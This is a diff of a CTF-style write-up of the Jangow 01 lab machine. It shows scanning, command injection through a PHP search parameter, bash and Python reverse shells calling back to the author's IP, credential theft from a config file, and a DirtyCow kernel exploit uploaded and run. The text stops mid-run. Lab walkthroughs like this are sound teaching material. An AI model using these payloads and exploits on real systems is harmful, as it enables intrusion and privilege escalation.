@@ -21,7 +21,7 @@ This works better with VirtualBox rather than VMware ## Changelog 2021-11-04 - v
 <h2 id="scanning-for-the-machine">Scanning for the machine</h2>
 <p>Jangow itself announces its IP.</p>
 <figure>
-<img src="1.IP-announcement.png" alt="" /><figcaption>1.IP-announcement</figcaption>
+    <img src="1.IP-announcement.png" alt="" /><figcaption>1.IP-announcement</figcaption>
 </figure>
 <pre class="shell"><code>fping -aAqg 192.168.56.1/24 | tee fping.txt
 192.168.56.1
@@ -29,7 +29,7 @@ This works better with VirtualBox rather than VMware ## Changelog 2021-11-04 - v
 192.168.56.70
 192.168.56.118</code></pre>
 <figure>
-<img src="2.fping.png" alt="" /><figcaption>2.fping</figcaption>
+    <img src="2.fping.png" alt="" /><figcaption>2.fping</figcaption>
 </figure>
 <pre class="shell"><code>export RHOST=&quot;192.168.56.118&quot;                                    
 export LHOST=&quot;192.168.56.70&quot;
@@ -39,7 +39,7 @@ export LPORT=&quot;443&quot;</code></pre>
 21/tcp open  ftp
 80/tcp open  http</code></pre>
 <figure>
-<img src="3.nmap-default.png" alt="" /><figcaption>3.nmap-default</figcaption>
+    <img src="3.nmap-default.png" alt="" /><figcaption>3.nmap-default</figcaption>
 </figure>
 <pre class="shell"><code>nmap $RHOST -n -p- -Pn -A -T4 --min-rate=5000 -sVC | tee nmap.tcp-ports.deep.txt
 ...
@@ -53,7 +53,7 @@ export LPORT=&quot;443&quot;</code></pre>
 |_http-server-header: Apache/2.4.18 (Ubuntu)
 Service Info: Host: 127.0.0.1; OS: Unix</code></pre>
 <figure>
-<img src="4.nmap-tcp-ports.png" alt="" /><figcaption>4.nmap-tcp-ports</figcaption>
+    <img src="4.nmap-tcp-ports.png" alt="" /><figcaption>4.nmap-tcp-ports</figcaption>
 </figure>
 <pre class="shell"><code>nikto -C all -host http://$RHOST | tee nikto.txt      
 - Nikto v2.1.6
@@ -88,7 +88,7 @@ Service Info: Host: 127.0.0.1; OS: Unix</code></pre>
 + 1 host(s) tested
 </code></pre>
 <figure>
-<img src="5.nikto.png" alt="" /><figcaption>5.nikto</figcaption>
+    <img src="5.nikto.png" alt="" /><figcaption>5.nikto</figcaption>
 </figure>
 <p><code>nmap $RHOST -n -p21,80 -Pn -T4 --min-rate=5000 -sVC --script=vuln,*enum* | tee nmap.vuln-enum.txt</code> is too much output, and is useless for now.</p>
 <pre class="shell"><code>feroxbuster -q -u http://$RHOST -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --rate-limit 100 -d 2 -L 4 -k       
@@ -98,14 +98,14 @@ Service Info: Host: 127.0.0.1; OS: Unix</code></pre>
 301        9l       28w      325c http://192.168.56.118/site/wordpress
 301        9l       28w      318c http://192.168.56.118/site/js</code></pre>
 <figure>
-<img src="6.feroxbuster.png" alt="" /><figcaption>6.feroxbuster</figcaption>
+    <img src="6.feroxbuster.png" alt="" /><figcaption>6.feroxbuster</figcaption>
 </figure>
 <p>Refer <a href="http://blog.f0c1s.com/sec/tools/feroxbuster.html">tool - feroxbuster</a> to know a bit more about feroxbuster.</p>
 <blockquote>
-<p><code>http://192.168.56.118/site/</code></p>
+    <p><code>http://192.168.56.118/site/</code></p>
 </blockquote>
 <figure>
-<img src="7.site.png" alt="" /><figcaption>7.site</figcaption>
+    <img src="7.site.png" alt="" /><figcaption>7.site</figcaption>
 </figure>
 <pre class="shell"><code>curl -s http://$RHOST/site/ -A &quot;Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)&quot; | sed -n &#39;s/.*src=&quot;\([^&quot;]*\).*/\1/p&#39; | sort | uniq | tee curl.src.txt
 assets/img/bg-masthead.jpg
@@ -129,27 +129,27 @@ https://startbootstrap.com/theme/grayscale/
 #page-top
 #projects</code></pre>
 <figure>
-<img src="8.curl-for-src-and-href.png" alt="" /><figcaption>8.curl-for-src-and-href</figcaption>
+    <img src="8.curl-for-src-and-href.png" alt="" /><figcaption>8.curl-for-src-and-href</figcaption>
 </figure>
 <p>There is one interesting url: <code>busque.php?buscar=</code>. This looks like RCE, LFI, or RFI opportunity.</p>
 <figure>
-<img src="9.enumerating-buscar.png" alt="" /><figcaption>9.enumerating-buscar</figcaption>
+    <img src="9.enumerating-buscar.png" alt="" /><figcaption>9.enumerating-buscar</figcaption>
 </figure>
 <figure>
-<img src="10.whoami.png" alt="" /><figcaption>10.whoami</figcaption>
+    <img src="10.whoami.png" alt="" /><figcaption>10.whoami</figcaption>
 </figure>
 <blockquote>
-<p><code>http://192.168.56.118/site/busque.php?buscar=bash -c id</code> works!</p>
+    <p><code>http://192.168.56.118/site/busque.php?buscar=bash -c id</code> works!</p>
 </blockquote>
 <figure>
-<img src="11.bash-c-id.png" alt="" /><figcaption>11.bash-c-id</figcaption>
+    <img src="11.bash-c-id.png" alt="" /><figcaption>11.bash-c-id</figcaption>
 </figure>
 <p><code>http://192.168.56.118/site/busque.php?buscar=bash%20-c%20bash%20-i%20%3E&amp;%20/dev/tcp/192.168.56.70/4444%200%3E&amp;1</code> and <code>http://192.168.56.118/site/busque.php?buscar=bash%20-c%20%22bash%20-i%20%3E&amp;%20/dev/tcp/192.168.56.70/4444%200%3E&amp;1%22</code> both fail</p>
 <blockquote>
-<p><code>view-source:http://192.168.56.118/site/busque.php?buscar=cat%20/etc/hosts</code></p>
+    <p><code>view-source:http://192.168.56.118/site/busque.php?buscar=cat%20/etc/hosts</code></p>
 </blockquote>
 <figure>
-<img src="12.etc-hosts.png" alt="" /><figcaption>12.etc-hosts</figcaption>
+    <img src="12.etc-hosts.png" alt="" /><figcaption>12.etc-hosts</figcaption>
 </figure>
 <pre class="shell"><code>view-source:http://192.168.56.118/site/busque.php?buscar=cat /etc/passwd
 
@@ -186,17 +186,17 @@ sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
 ftp:x:111:118:ftp daemon,,,:/srv/ftp:/bin/false
 mysql:x:112:119:MySQL Server,,,:/nonexistent:/bin/false</code></pre>
 <figure>
-<img src="13.etc-passwd.png" alt="" /><figcaption>13.etc-passwd</figcaption>
+    <img src="13.etc-passwd.png" alt="" /><figcaption>13.etc-passwd</figcaption>
 </figure>
 <p>This tells me that there is a user by the name “jangow01” and that it has a home directory of “/home/jangow01”</p>
 <blockquote>
-<p><code>view-source:http://192.168.56.118/site/busque.php?buscar=ls /home/jangow01</code></p>
+    <p><code>view-source:http://192.168.56.118/site/busque.php?buscar=ls /home/jangow01</code></p>
 </blockquote>
 <figure>
-<img src="14.ls-home-jangow01.png" alt="" /><figcaption>14.ls-home-jangow01</figcaption>
+    <img src="14.ls-home-jangow01.png" alt="" /><figcaption>14.ls-home-jangow01</figcaption>
 </figure>
 <blockquote>
-<p><code>view-source:http://192.168.56.118/site/busque.php?buscar=ls -la /home/jangow01</code></p>
+    <p><code>view-source:http://192.168.56.118/site/busque.php?buscar=ls -la /home/jangow01</code></p>
 </blockquote>
 <pre><code>total 36
 drwxr-xr-x 4 jangow01 desafio02 4096 Jun 10  2021 .
@@ -210,17 +210,17 @@ drwxrwxr-x 2 jangow01 desafio02 4096 Jun 10  2021 .nano
 -rw-r--r-- 1 jangow01 desafio02    0 Jun 10  2021 .sudo_as_admin_successful
 -rw-rw-r-- 1 jangow01 desafio02   33 Jun 10  2021 user.txt</code></pre>
 <figure>
-<img src="15.ls-la-home-jangow01.png" alt="" /><figcaption>15.ls-la-home-jangow01</figcaption>
+    <img src="15.ls-la-home-jangow01.png" alt="" /><figcaption>15.ls-la-home-jangow01</figcaption>
 </figure>
 <blockquote>
-<p>flag user.txt: <code>view-source:http://192.168.56.118/site/busque.php?buscar=cat /home/jangow01/user.txt</code></p>
+    <p>flag user.txt: <code>view-source:http://192.168.56.118/site/busque.php?buscar=cat /home/jangow01/user.txt</code></p>
 </blockquote>
 <pre class="shell"><code>d41d8cd98f00b204e9800998ecf8427e</code></pre>
 <figure>
-<img src="16.user-flag.png" alt="" /><figcaption>16.user-flag</figcaption>
+    <img src="16.user-flag.png" alt="" /><figcaption>16.user-flag</figcaption>
 </figure>
 <blockquote>
-<p><code>find</code> works?</p>
+    <p><code>find</code> works?</p>
 </blockquote>
 <pre class="shell"><code>view-source:http://192.168.56.118/site/busque.php?buscar=find / -perm -4000 2&gt;/dev/null
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
@@ -247,23 +247,23 @@ drwxrwxr-x 2 jangow01 desafio02 4096 Jun 10  2021 .nano
 /bin/ping6
 /bin/mount</code></pre>
 <figure>
-<img src="17.find-set-SUID-binaries.png" alt="" /><figcaption>17.find-set-SUID-binaries</figcaption>
+    <img src="17.find-set-SUID-binaries.png" alt="" /><figcaption>17.find-set-SUID-binaries</figcaption>
 </figure>
 <blockquote>
-<p><code>which python3</code></p>
+    <p><code>which python3</code></p>
 </blockquote>
 <p>Well, there is no python, but python3 is available.</p>
 <figure>
-<img src="18.which-python3.png" alt="" /><figcaption>18.which-python3</figcaption>
+    <img src="18.which-python3.png" alt="" /><figcaption>18.which-python3</figcaption>
 </figure>
 <blockquote>
-<p>Python reverse shell</p>
+    <p>Python reverse shell</p>
 </blockquote>
 <div class="sourceCode" id="cb13"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true"></a>python3 <span class="op">-</span>c <span class="st">&#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.56.66&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)&#39;</span></span></code></pre></div>
 <p>I was not able to get a connection on <code>4444</code>, but then received a connection on <code>443</code>.</p>
-<div class="sourceCode" id="cb14"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true"></a>python3 <span class="op">-</span>c <span class="st">&#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.56.66&quot;,443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)&#39;</span></span></code></pre></div>
+<div class="sourceCode" id="cb14"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true"></a>python3 <span class="op">-</span>c <span class="st">&#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.56.70&quot;,443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)&#39;</span></span></code></pre></div>
 <pre class="shell"><code>sudo nc -nlvp 443 -s $LHOST
-[sudo] password for f0c1s: 
+[sudo] password for f0c1s:
 Listening on 192.168.56.70 443
 Connection received on 192.168.56.118 38332
 $ whoami
@@ -288,7 +288,7 @@ $ date
 date
 Thu Dec 16 10:25:10 BRST 2021</code></pre>
 <figure>
-<img src="19.caught-shell.png" alt="" /><figcaption>19.caught-shell</figcaption>
+    <img src="19.caught-shell.png" alt="" /><figcaption>19.caught-shell</figcaption>
 </figure>
 <pre class="shell"><code>$ ls -lahR /home
 ls -lahR /home
@@ -316,16 +316,16 @@ ls: cannot open directory &#39;/home/jangow01/.cache&#39;: Permission denied
 total 8.0K
 drwxrwxr-x 2 jangow01 desafio02 4.0K Jun 10  2021 .
 drwxr-xr-x 4 jangow01 desafio02 4.0K Jun 10  2021 ..
-$ 
+$
 
 $ cat /home/jangow01/user.txt
 cat /home/jangow01/user.txt
 d41d8cd98f00b204e9800998ecf8427e</code></pre>
 <figure>
-<img src="20.user-flag-again.png" alt="" /><figcaption>20.user-flag-again</figcaption>
+    <img src="20.user-flag-again.png" alt="" /><figcaption>20.user-flag-again</figcaption>
 </figure>
 <blockquote>
-<p>Find config or password?</p>
+    <p>Find config or password?</p>
 </blockquote>
 <pre class="shell"><code>$ whoami
 whoami
@@ -384,10 +384,10 @@ drwxr-xr-x 6 www-data www-data 4.0K Jun 10  2021 ..
 -rw-r--r-- 1 www-data www-data  347 Jun 10  2021 config.php
 -rw-r--r-- 1 www-data www-data  10K Jun 10  2021 index.html</code></pre>
 <figure>
-<img src="21.find-config-php.png" alt="" /><figcaption>21.find-config-php</figcaption>
+    <img src="21.find-config-php.png" alt="" /><figcaption>21.find-config-php</figcaption>
 </figure>
 <blockquote>
-<p>find user:pass</p>
+    <p>find user:pass</p>
 </blockquote>
 <pre class="shell"><code>$ cat wordpress/config.php | grep -i &quot;user\|pass&quot;
 cat wordpress/config.php | grep -i &quot;user\|pass&quot;
@@ -395,17 +395,17 @@ $username = &quot;desafio02&quot;;
 $password = &quot;abygurl69&quot;;
 $conn = mysqli_connect($servername, $username, $password, $database);</code></pre>
 <figure>
-<img src="22.find-user-pass.png" alt="" /><figcaption>22.find-user-pass</figcaption>
+    <img src="22.find-user-pass.png" alt="" /><figcaption>22.find-user-pass</figcaption>
 </figure>
 <blockquote>
-<p>find if <code>mysql</code> is running</p>
+    <p>find if <code>mysql</code> is running</p>
 </blockquote>
 <pre class="shell"><code>$ ps -ef | grep -i mysql
 ps -ef | grep -i mysql
 mysql     2769     1  0 09:13 ?        00:00:02 /usr/sbin/mysqld
 www-data  3463  3455  0 10:32 pts/1    00:00:00 grep -i mysql</code></pre>
 <blockquote>
-<p>Here are the rest of processes though</p>
+    <p>Here are the rest of processes though</p>
 </blockquote>
 <pre class="shell"><code>$ ps -ef
 ps -ef
@@ -587,7 +587,7 @@ www-data  3454  3453  0 10:27 ?        00:00:00 python3 -c import socket,os,pty;
 www-data  3455  3454  0 10:27 pts/1    00:00:00 /bin/sh
 www-data  3464  3455  0 10:32 pts/1    00:00:00 ps -ef</code></pre>
 <blockquote>
-<p>mysql access denied for credentials “desafio02:abygurl69”</p>
+    <p>mysql access denied for credentials “desafio02:abygurl69”</p>
 </blockquote>
 <pre class="shell"><code>$ mysql -u desafio02 -p
 mysql -u desafio02 -p
@@ -595,7 +595,7 @@ Enter password: abygurl69
 
 ERROR 1045 (28000): Access denied for user &#39;desafio02&#39;@&#39;localhost&#39; (using password: YES)</code></pre>
 <blockquote>
-<p>find writable files</p>
+    <p>find writable files</p>
 </blockquote>
 <pre class="shell"><code>$ find / -writable -not -path &quot;/proc/*&quot; -not -path &quot;/run/*&quot; -not -path &quot;/snap/*&quot; -not -path &quot;/dev/*&quot; -not -path &quot;/sys/*&quot; 2&gt;/dev/null
 find / -writable -not -path &quot;/proc/*&quot; -not -path &quot;/run/*&quot; -not -path &quot;/snap/*&quot; -not -path &quot;/dev/*&quot; -not -path &quot;/sys/*&quot; 2&gt;/dev/null
@@ -682,7 +682,7 @@ if (!$conn) {
 echo &quot;Connected successfully&quot;;
 mysqli_close($conn);</code></pre>
 <figure>
-<img src="23.more-mysql-credentials.png" alt="" /><figcaption>23.more-mysql-credentials</figcaption>
+    <img src="23.more-mysql-credentials.png" alt="" /><figcaption>23.more-mysql-credentials</figcaption>
 </figure>
 <p>Well, credentials <code>jangow01:abygurl69</code> fails.</p>
 <pre><code>mysql -u jangow01 -p abygurl69
@@ -702,10 +702,10 @@ mysql -uroot -pabygurl69 -Djangow01 -e &#39;show databases;&#39;
 
 mysql -ujangow01 -pjangow01 -Djangow01</code></pre>
 <figure>
-<img src="24-failing-mysql-access.png" alt="" /><figcaption>24-failing-mysql-access</figcaption>
+    <img src="24-failing-mysql-access.png" alt="" /><figcaption>24-failing-mysql-access</figcaption>
 </figure>
 <blockquote>
-<p>Looking for more backup files</p>
+    <p>Looking for more backup files</p>
 </blockquote>
 <pre class="shell"><code>$ find / -type f -name &quot;*backup*&quot; 2&gt;/dev/null
 find / -type f -name &quot;*backup*&quot; 2&gt;/dev/null
@@ -724,7 +724,7 @@ $ file /script/backup
 file /script/backup
 /script/backup: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9669c33d8833b1466ca0358ddccb99ff8fdc8730, not stripped</code></pre>
 <figure>
-<img src="25.backup-file.png" alt="" /><figcaption>25.backup-file</figcaption>
+    <img src="25.backup-file.png" alt="" /><figcaption>25.backup-file</figcaption>
 </figure>
 <p>This is an interesting file.</p>
 <p><code>strings /script/backup</code> hints towards a file named <code>backup.sh.x.c</code>. but this file does not exist.</p>
@@ -740,10 +740,10 @@ touch /var/backups/backup.txt
 touch: cannot touch &#39;/var/backups/backup.txt&#39;: Permission denied</code></pre>
 <p>I can get this binary out and maybe study it in ghidra.</p>
 <figure>
-<img src="26.what-is-even-script-backup.png" alt="" /><figcaption>26.what-is-even-script-backup</figcaption>
+    <img src="26.what-is-even-script-backup.png" alt="" /><figcaption>26.what-is-even-script-backup</figcaption>
 </figure>
 <blockquote>
-<p>wget just fails</p>
+    <p>wget just fails</p>
 </blockquote>
 <pre class="shell"><code>$ wget 192.168.56.70:80/lse.sh
 wget 192.168.56.70:80/lse.sh
@@ -751,14 +751,14 @@ wget 192.168.56.70:80/lse.sh
 Connecting to 192.168.56.70:80... ^C
 </code></pre>
 <blockquote>
-<p>FTP jangow01:abygurl69 works.</p>
+    <p>FTP jangow01:abygurl69 works.</p>
 </blockquote>
 <pre class="shell"><code>ftp -p $RHOST 21
 Connected to 192.168.56.118.
 220 (vsFTPd 3.0.3)
 Name (192.168.56.118:f0c1s): jangow01
 331 Please specify the password.
-Password: 
+Password:
 230 Login successful.
 Remote system type is UNIX.
 Using binary mode to transfer files.
@@ -836,10 +836,10 @@ local: .backup remote: .backup
 ftp&gt; exit
 221 Goodbye.</code></pre>
 <figure>
-<img src="27.ftp-access.png" alt="" /><figcaption>27.ftp-access</figcaption>
+    <img src="27.ftp-access.png" alt="" /><figcaption>27.ftp-access</figcaption>
 </figure>
 <blockquote>
-<p>Getting /script/backup out of jangow via ftp</p>
+    <p>Getting /script/backup out of jangow via ftp</p>
 </blockquote>
 <pre class="shell"><code>$ cd html
 cd html
@@ -863,12 +863,12 @@ cp /script/backup ./
 $ ls
 ls
 assets  backup  busque.php  css  index.html  js  wget-log  wordpress</code></pre>
-<pre class="shell"><code>ftp -p $RHOST 21                           
+<pre class="shell"><code>ftp -p $RHOST 21
 Connected to 192.168.56.118.
 220 (vsFTPd 3.0.3)
 Name (192.168.56.118:f0c1s): jangow01
 331 Please specify the password.
-Password: 
+Password:
 230 Login successful.
 Remote system type is UNIX.
 Using binary mode to transfer files.
@@ -908,13 +908,13 @@ local: backup remote: backup
 ftp&gt; exit
 421 Timeout.</code></pre>
 <figure>
-<img src="28.copy-script-backup-to-ftp-dir.png" alt="" /><figcaption>28.copy-script-backup-to-ftp-dir</figcaption>
+    <img src="28.copy-script-backup-to-ftp-dir.png" alt="" /><figcaption>28.copy-script-backup-to-ftp-dir</figcaption>
 </figure>
 <figure>
-<img src="29.get-script-backup-via-ftp.png" alt="" /><figcaption>29.get-script-backup-via-ftp</figcaption>
+    <img src="29.get-script-backup-via-ftp.png" alt="" /><figcaption>29.get-script-backup-via-ftp</figcaption>
 </figure>
 <blockquote>
-<p>ghidra</p>
+    <p>ghidra</p>
 </blockquote>
 <div class="sourceCode" id="cb33"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true"></a>undefined8 main(undefined4 param_1,undefined8 *param_2)</span>
 <span id="cb33-2"><a href="#cb33-2" aria-hidden="true"></a></span>
@@ -952,11 +952,11 @@ ftp&gt; exit
 <span id="cb33-34"><a href="#cb33-34" aria-hidden="true"></a>  <span class="cf">return</span> <span class="dv">1</span>;</span>
 <span id="cb33-35"><a href="#cb33-35" aria-hidden="true"></a>}</span></code></pre></div>
 <figure>
-<img src="30.ghidra-script-backup-main-function.png" alt="" /><figcaption>30.ghidra-script-backup-main-function</figcaption>
+    <img src="30.ghidra-script-backup-main-function.png" alt="" /><figcaption>30.ghidra-script-backup-main-function</figcaption>
 </figure>
 <p>While looking for something, I realized I have a few credentials, may be I should try to become <code>jangow01</code>.</p>
 <blockquote>
-<p>login as jangow01</p>
+    <p>login as jangow01</p>
 </blockquote>
 <pre class="shell"><code>$ su jangow01
 su jangow01
@@ -976,14 +976,14 @@ Sinto muito, tente novamente.
 Sinto muito, usuário jangow01 não pode executar sudo em jangow01.
 </code></pre>
 <figure>
-<img src="31.login-as-jangow01.png" alt="" /><figcaption>31.login-as-jangow01</figcaption>
+    <img src="31.login-as-jangow01.png" alt="" /><figcaption>31.login-as-jangow01</figcaption>
 </figure>
 <p>I don’t need to translate what it means. I bet it says user jangow01 cannot run as sudo.</p>
 <figure>
-<img src="32.cannot-run-sudo-as-jangow01.png" alt="" /><figcaption>32.cannot-run-sudo-as-jangow01</figcaption>
+    <img src="32.cannot-run-sudo-as-jangow01.png" alt="" /><figcaption>32.cannot-run-sudo-as-jangow01</figcaption>
 </figure>
 <blockquote>
-<p>Badly failing at figuring out what to do next</p>
+    <p>Badly failing at figuring out what to do next</p>
 </blockquote>
 <pre class="shell"><code>jangow01@jangow01:~$ ls -la
 ls -la
@@ -1005,7 +1005,7 @@ ls /root/script
 sudo su
 ls /script
 cd /script
-./backup 
+./backup
 ls -lsah
 exit
 sudo su
@@ -1017,7 +1017,7 @@ ls -la
 cd html
 ls
 ls -la
-nano /etc/apache2/sites-enabled/000-default.conf 
+nano /etc/apache2/sites-enabled/000-default.conf
 su
 exit
 exit
@@ -1066,7 +1066,7 @@ jangow01 não está no arquivo sudoers. Este incidente será relatado.
 jangow01@jangow01:~$</code></pre>
 <p>The user jangow01 is not in sudoers list, and desafio02 has been removed from the system.</p>
 <blockquote>
-<p><code>cat .bash_history</code></p>
+    <p><code>cat .bash_history</code></p>
 </blockquote>
 <pre class="shell"><code>jangow01@jangow01:~$ cat .bash_history
 cat .bash_history
@@ -1075,7 +1075,7 @@ ls /root/script
 sudo su
 ls /script
 cd /script
-./backup 
+./backup
 ls -lsah
 exit
 sudo su
@@ -1087,13 +1087,13 @@ ls -la
 cd html
 ls
 ls -la
-nano /etc/apache2/sites-enabled/000-default.conf 
+nano /etc/apache2/sites-enabled/000-default.conf
 su
 exit
 exit</code></pre>
 <p>Well, credentials seem to be useless from here…</p>
 <blockquote>
-<p>look for kernel bugs</p>
+    <p>look for kernel bugs</p>
 </blockquote>
 <pre class="shell"><code>jangow01@jangow01:/var/www/html/site$ uname -a
 uname -a
@@ -1115,7 +1115,7 @@ SUPPORT_URL=&quot;http://help.ubuntu.com/&quot;
 BUG_REPORT_URL=&quot;http://bugs.launchpad.net/ubuntu/&quot;
 UBUNTU_CODENAME=xenial
 jangow01@jangow01:/var/www/html/site$</code></pre>
-<pre class="shell"><code>searchsploit linux kernel 4.4     
+<pre class="shell"><code>searchsploit linux kernel 4.4
 --------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                   |  Path
 --------------------------------------------------------------------------------- ---------------------------------
@@ -1159,7 +1159,7 @@ Shellcodes: No Results
 Papers: No Results
 </code></pre>
 <figure>
-<img src="33.searchsploit.png" alt="" /><figcaption>33.searchsploit</figcaption>
+    <img src="33.searchsploit.png" alt="" /><figcaption>33.searchsploit</figcaption>
 </figure>
 <p>The version of ubuntu is 16.04, the kernel version is 4.4.0-31.</p>
 <pre class="shell"><code>searchsploit linux kernel 4.4.0 | grep local | grep -i priv
@@ -1176,7 +1176,294 @@ Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation       
 Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Esca | linux/local/43418.c
 </code></pre>
 <figure>
-<img src="34.refined-searchsploit.png" alt="" /><figcaption>34.refined-searchsploit</figcaption>
+    <img src="34.refined-searchsploit.png" alt="" /><figcaption>34.refined-searchsploit</figcaption>
 </figure>
 <p>I cannot wget or ftp files onto the machine. Stopping here. Will do it later.</p>
 <p>Not rooted, yet!</p>
+<h2 id="continuing-on-2021.12.19-sunday">Continuing on 2021.12.19 Sunday</h2>
+<pre class="shell"><code>hostname -I: 192.168.42.7 192.168.56.70
+Sunday 19 December 2021 05:13:25 PM IST 2021.12.19 17:13:25
+f0c1s@kali:~ $
+cd vuln-hubs/jangow-01
+
+
+
+hostname -I: 192.168.42.7 192.168.56.70
+Sunday 19 December 2021 05:13:34 PM IST 2021.12.19 17:13:34
+f0c1s@kali:~/vuln-hubs/jangow-01 $
+ls
+43418.c  curl.href.txt  curl.src.txt  ferox-http_192_168_56_118-1639634748.state  fping.txt  ftp  nikto.txt  nmap.default.txt  nmap.tcp-ports.deep.txt  nmap.vuln-enum.txt  script-backup
+
+
+
+hostname -I: 192.168.42.7 192.168.56.70
+Sunday 19 December 2021 05:13:44 PM IST 2021.12.19 17:13:44
+f0c1s@kali:~/vuln-hubs/jangow-01 $
+wget -q https://gist.githubusercontent.com/scumjr/17d91f20f73157c722ba2aea702985d2/raw/a37178567ca7b816a5c6f891080770feca5c74d7/dirtycow-mem.c
+
+
+
+hostname -I: 192.168.42.7 192.168.56.70
+Sunday 19 December 2021 05:14:06 PM IST 2021.12.19 17:14:06
+f0c1s@kali:~/vuln-hubs/jangow-01 $
+head -n30 dirtycow-mem.c
+/*
+ * CVE-2016-5195 dirtypoc
+ *
+ * This PoC is memory only and doesn&#39;t write anything on the filesystem.
+ * /!\ Beware, it triggers a kernel crash a few minutes.
+ *
+ * gcc -Wall -o dirtycow-mem dirtycow-mem.c -ldl -lpthread
+ */
+
+#define _GNU_SOURCE
+#include &lt;err.h&gt;
+#include &lt;dlfcn.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;limits.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;stdbool.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;sys/user.h&gt;
+#include &lt;sys/wait.h&gt;
+#include &lt;sys/types.h&gt;
+
+
+#define SHELLCODE       &quot;\x31\xc0\xc3&quot;
+#define SPACE_SIZE      256
+#define LIBC_PATH       &quot;/lib/x86_64-linux-gnu/libc.so.6&quot;
+
+
+
+hostname -I: 192.168.42.7 192.168.56.70
+Sunday 19 December 2021 05:14:13 PM IST 2021.12.19 17:14:13
+f0c1s@kali:~/vuln-hubs/jangow-01 $
+gcc -Wall -o dirtycow-mem dirtycow-mem.c -ldl -lpthread
+dirtycow-mem.c: In function ‘get_range’:
+dirtycow-mem.c:139:30: warning: use of assignment suppression and length modifier together in gnu_scanf format [-Wformat=]
+  139 |                 sscanf(line, &quot;%lx-%lx %s %*Lx %*x:%*x %*Lu %s&quot;, start, end, flags, filename);
+      |                              ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+dirtycow-mem.c:139:30: warning: use of assignment suppression and length modifier together in gnu_scanf format [-Wformat=]
+
+
+hostname -I: 192.168.42.7 192.168.56.70
+Sunday 19 December 2021 05:14:27 PM IST 2021.12.19 17:14:27
+f0c1s@kali:~/vuln-hubs/jangow-01 $
+export RHOST=&quot;192.168.56.118&quot;
+export LHOST=&quot;192.168.56.70&quot;
+export LPORT=&quot;443&quot;
+
+
+
+hostname -I: 192.168.42.7 192.168.56.70
+Sunday 19 December 2021 05:14:32 PM IST 2021.12.19 17:14:32
+f0c1s@kali:~/vuln-hubs/jangow-01 $
+ftp $RHOST 21
+Connected to 192.168.56.118.
+220 (vsFTPd 3.0.3)
+Name (192.168.56.118:f0c1s): jangow01
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; cd /tmp
+250 Directory successfully changed.
+ftp&gt; put dirtycow-mem
+local: dirtycow-mem remote: dirtycow-mem
+229 Entering Extended Passive Mode (|||34323|)
+150 Ok to send data.
+100% |**********************************************************************| 17936      123.05 MiB/s    00:00 ETA
+226 Transfer complete.
+17936 bytes sent in 00:00 (24.40 MiB/s)
+ftp&gt; exit
+221 Goodbye.
+
+
+
+hostname -I: 192.168.42.7 192.168.56.70
+Sunday 19 December 2021 05:14:55 PM IST 2021.12.19 17:14:55
+f0c1s@kali:~/vuln-hubs/jangow-01 $
+sudo nc -nlvp $LPORT -s $LHOST
+[sudo] password for f0c1s:
+Listening on 192.168.56.70 443
+Connection received on 192.168.56.118 37180
+$ su jangow01
+su jangow01
+Password: abygurl69
+
+jangow01@jangow01:/var/www/html/site$ cd /tmp
+cd /tmp
+jangow01@jangow01:/tmp$ ls -la
+ls -la
+total 52
+drwxrwxrwt  8 root     root       4096 Dez 19 15:17 .
+drwxr-xr-x 24 root     root       4096 Jun 10  2021 ..
+-rw-------  1 jangow01 desafio02 17936 Dez 19 15:14 dirtycow-mem
+drwxrwxrwt  2 root     root       4096 Dez 19 15:13 .font-unix
+drwxrwxrwt  2 root     root       4096 Dez 19 15:13 .ICE-unix
+drwx------  3 root     root       4096 Dez 19 15:13 systemd-private-cea2886cc4ab4d8198072a50e863aef7-systemd-timesyncd.service-pGCazj
+drwxrwxrwt  2 root     root       4096 Dez 19 15:13 .Test-unix
+drwxrwxrwt  2 root     root       4096 Dez 19 15:13 .X11-unix
+drwxrwxrwt  2 root     root       4096 Dez 19 15:13 .XIM-unix
+jangow01@jangow01:/tmp$ ./dirtycow-mem
+./dirtycow-mem
+bash: ./dirtycow-mem: Permissão negada
+jangow01@jangow01:/tmp$ chmod +x dirtycow-mem
+chmod +x dirtycow-mem
+jangow01@jangow01:/tmp$ ./dirtycow-mem
+./dirtycow-mem
+[*] range: 7fcc47964000-7fcc47b24000]
+[*] getuid = 7fcc47a312c0
+[*] mmap 0x7fcc481a0000
+[*] exploiting (patch)
